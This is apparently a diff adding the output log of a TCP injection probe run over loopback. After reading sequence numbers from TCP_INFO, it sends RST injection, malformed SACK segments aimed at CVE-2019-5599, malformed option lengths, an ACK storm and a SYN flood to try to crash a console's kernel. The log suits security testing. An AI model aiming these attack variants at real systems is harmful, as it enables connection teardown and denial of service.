@@ -1,0 +1,240 @@
+=== PROBE 49a: TCP STATEFUL INJECTION ===
+
+pid: 149
+--- SECTION A: TCP connection setup ---
+  server socket: fd=22
+  bind 127.0.0.1:31337 → ret=0
+  listen → ret=0
+  client socket: fd=23
+  connect → ret=0
+  accept → fd=24
+  client port: 56810
+  connection: 127.0.0.1:56810 → 127.0.0.1:31337
+
+--- SECTION B: TCP_INFO sequence number discovery ---
+  [before data exchange]
+  client: getsockopt ret=0 len=236
+    +000: 0x00000004 (4)
+    +004: 0x00770700 (7800576)
+    +008: 0x00038270 (230000)
+    +012: 0x00000000 (0)
+    +016: 0x00003FD8 (16344)
+    +020: 0x00003FD8 (16344)
+    +024: 0x00000000 (0)
+    +028: 0x00000000 (0)
+    +032: 0x00000000 (0)
+    +036: 0x00000000 (0)
+    +040: 0x00000000 (0)
+    +044: 0x00000000 (0)
+    +048: 0x00000000 (0)
+    +052: 0x00001388 (5000)
+    +056: 0x00000000 (0)
+    +060: 0x00000000 (0)
+    +064: 0x00000000 (0)
+    +068: 0x000003E8 (1000)
+    +072: 0x000001F4 (500)
+    +076: 0x3FFFC000 (1073725440)
+    ... (29 lines omitted) ...
+    +196: 0x00000000 (0)
+    +200: 0x00000000 (0)
+    +204: 0x00000000 (0)
+    +208: 0x00000000 (0)
+    +212: 0x00000000 (0)
+    +216: 0x00000000 (0)
+    +220: 0x00000000 (0)
+    +224: 0x00000000 (0)
+    +228: 0x00000000 (0)
+    +232: 0x00000000 (0)
+  server(accepted): getsockopt ret=0 len=236
+    +000: 0x00000004 (4)
+    +004: 0x00770700 (7800576)
+    +008: 0x000F4240 (1000000)
+    +012: 0x00000000 (0)
+    +016: 0x00003FD8 (16344)
+    +020: 0x00003FD8 (16344)
+    +024: 0x00000000 (0)
+    +028: 0x00000000 (0)
+    +032: 0x00000000 (0)
+    +036: 0x00000000 (0)
+    +040: 0x00000000 (0)
+    +044: 0x00000000 (0)
+    +048: 0x00000000 (0)
+    +052: 0x000032C8 (13000)
+    +056: 0x00000000 (0)
+    +060: 0x00000000 (0)
+    +064: 0x00000000 (0)
+    +068: 0x00000000 (0)
+    +072: 0x0003D090 (250000)
+    +076: 0x3FFFC000 (1073725440)
+    ... (29 lines omitted) ...
+    +196: 0x00000000 (0)
+    +200: 0x00000000 (0)
+    +204: 0x00000000 (0)
+    +208: 0x00000000 (0)
+    +212: 0x00000000 (0)
+    +216: 0x00000000 (0)
+    +220: 0x00000000 (0)
+    +224: 0x00000000 (0)
+    +228: 0x00000000 (0)
+    +232: 0x00000000 (0)
+
+  client write 100 bytes → ret=100
+  server read → ret=100
+  server write 50 bytes → ret=50
+  client read → ret=50
+
+  [after data exchange: client sent 100, server sent 50]
+  client: getsockopt ret=0 len=236
+    +000: 0x00000004 (4)
+    +004: 0x00770700 (7800576)
+    +008: 0x00038270 (230000)
+    +012: 0x00000000 (0)
+    +016: 0x00003FD8 (16344)
+    +020: 0x00003FD8 (16344)
+    +024: 0x00000000 (0)
+    +028: 0x00000000 (0)
+    +032: 0x00000000 (0)
+    +036: 0x00000000 (0)
+    +040: 0x00000000 (0)
+    +044: 0x00000000 (0)
+    +048: 0x00000000 (0)
+    +052: 0x00000FA0 (4000)
+    +056: 0x00000000 (0)
+    +060: 0x00000000 (0)
+    +064: 0x00000000 (0)
+    +068: 0x00000465 (1125)
+    +072: 0x00000271 (625)
+    +076: 0x3FFFC000 (1073725440)
+    ... (29 lines omitted) ...
+    +196: 0x00000000 (0)
+    +200: 0x00000000 (0)
+    +204: 0x00000000 (0)
+    +208: 0x00000000 (0)
+    +212: 0x00000000 (0)
+    +216: 0x00000000 (0)
+    +220: 0x00000000 (0)
+    +224: 0x00000000 (0)
+    +228: 0x00000000 (0)
+    +232: 0x00000000 (0)
+  server(accepted): getsockopt ret=0 len=236
+    +000: 0x00000004 (4)
+    +004: 0x00770700 (7800576)
+    +008: 0x000F4240 (1000000)
+    +012: 0x00000000 (0)
+    +016: 0x00003FD8 (16344)
+    +020: 0x00003FD8 (16344)
+    +024: 0x00000000 (0)
+    +028: 0x00000000 (0)
+    +032: 0x00000000 (0)
+    +036: 0x00000000 (0)
+    +040: 0x00000000 (0)
+    +044: 0x00000000 (0)
+    +048: 0x00000000 (0)
+    +052: 0x00002EE0 (12000)
+    +056: 0x00000000 (0)
+    +060: 0x00000000 (0)
+    +064: 0x00000000 (0)
+    +068: 0x00000000 (0)
+    +072: 0x0003D090 (250000)
+    +076: 0x3FFFC000 (1073725440)
+    ... (29 lines omitted) ...
+    +196: 0x00000000 (0)
+    +200: 0x00000000 (0)
+    +204: 0x00000000 (0)
+    +208: 0x00000000 (0)
+    +212: 0x00000000 (0)
+    +216: 0x00000000 (0)
+    +220: 0x00000000 (0)
+    +224: 0x00000000 (0)
+    +228: 0x00000000 (0)
+    +232: 0x00000000 (0)
+
+  [sequence number analysis]
+    CLI +108: changed by +100 (0x7F10A75E → 0x7F10A7C2) ★ LIKELY SND_NXT
+    SRV +108: changed by +50  (0x57DB27AD → 0x57DB27DF) ★ LIKELY SND_NXT
+    CLI +112: changed by +50  (0x57DB27AD → 0x57DB27DF) ★ LIKELY RCV_NXT
+    SRV +112: changed by +100 (0x7F10A75E → 0x7F10A7C2) ★ LIKELY RCV_NXT
+  → inject seq (client snd_nxt): 0x7F10A7C2
+  → inject ack (client rcv_nxt): 0x57DB27DF
+  ★ SEQUENCE NUMBERS FOUND — precise injection possible!
+
+--- SECTION C: Raw socket setup ---
+  raw socket: fd=25
+  IP_HDRINCL set
+
+--- SECTION D: TCP segment injection ---
+  Injecting as CLIENT (56810 → 31337)
+  seq=0x7F10A7C2 ack=0x57DB27DF
+
+  D1: ACK valid (baseline)                   ret=40
+  D2: RST exact seq                          ret=40
+  server TCP state after RST: 4 (4=ESTABLISHED)
+
+  D3: SYN in ESTABLISHED (challenge ACK?)    ret=40
+  D4: FIN+ACK valid seq                      ret=40
+  D5: RST+SYN invalid combo                  ret=40
+  D6: all TCP flags set (0xFF)               ret=40
+  D7: ACK window=0 (persist timer)           ret=40
+  D8: ACK window=1 (shrink)                  ret=40
+  D9: URG ptr=0xFFFF (no data)               ret=40
+  D10: URG+data 100B ptr=0xFFFF              ret=140
+  D11: data seq far future (+2GB)            ret=90
+  D12: data seq in past (-1000)              ret=90
+  D13: ACK ack_num far future (+2GB)         ret=40
+
+--- SECTION E: TCP option attacks ---
+  Targets: SACK processing (CVE-2019-5599), timestamp PAWS
+
+  E1: SACK 1 block [1-100]                   ret=52
+  E2: SACK 4 blocks (max)                    ret=76
+  E3: SACK left > right (invalid)            ret=52
+  E4: SACK overlapping blocks                ret=60
+  E5: SACK zero-width [256,256]              ret=52
+  E6: SACK len=50 but only 1 block           ret=52
+  E7: SACK in-window [ack, ack+100]          ret=52
+  E8: Timestamp TSval=1 (PAWS old)           ret=52
+  E9: Timestamp TSval=max TSecr=max          ret=52
+  E10: MSS=1 in non-SYN                      ret=48
+  E11: WinScale=14 in non-SYN                ret=48
+  E12: TCP-MD5 option (fake digest)          ret=60
+  E13: unknown option kind=253               ret=52
+  E14: option kind=42 len=0 (parser crash?)  ret=48
+  E15: option kind=42 len=1 (undersize)      ret=48
+  E16: option len=255 (read past buffer)     ret=48
+
+--- SECTION F: State transition attacks ---
+
+  pre-close client write: ret=10
+  client closed (FIN sent)
+  F1: data after FIN (post-close)            ret=90
+  F2: RST in CLOSE_WAIT/TIME_WAIT            ret=40
+  F3: SYN recycle in TIME_WAIT               ret=40
+  F4: sending 100 rapid ACKs...
+  F4: 100 ACKs sent                            ret=batch
+  F5: 50 SYNs to random ports...
+  F5: 50 SYN flood sent                        ret=batch
+
+=== SUMMARY ===
+  Injected segments: 182
+  Send errors: 0
+
+  ★ Sequence numbers extracted from TCP_INFO!
+    Client SND_NXT at offset +108
+    Client RCV_NXT at offset +112
+    Server SND_NXT at offset +108
+    Server RCV_NXT at offset +112
+
+  If console rebooted → kernel TCP bug found!
+  Check which variant was last printed before crash.
+
+  Key attacks:
+    D2: RST injection (connection teardown)
+    D3: SYN in ESTABLISHED (RFC 5961)
+    D7: Zero window (persist timer)
+    E1-E7: SACK processing (CVE-2019-5599)
+    E8-E9: Timestamp PAWS
+    E14-E16: TCP option len bugs (parser crash)
+    F1: Data after FIN
+    F4: ACK storm
+
+=== PROBE 49a COMPLETE ===
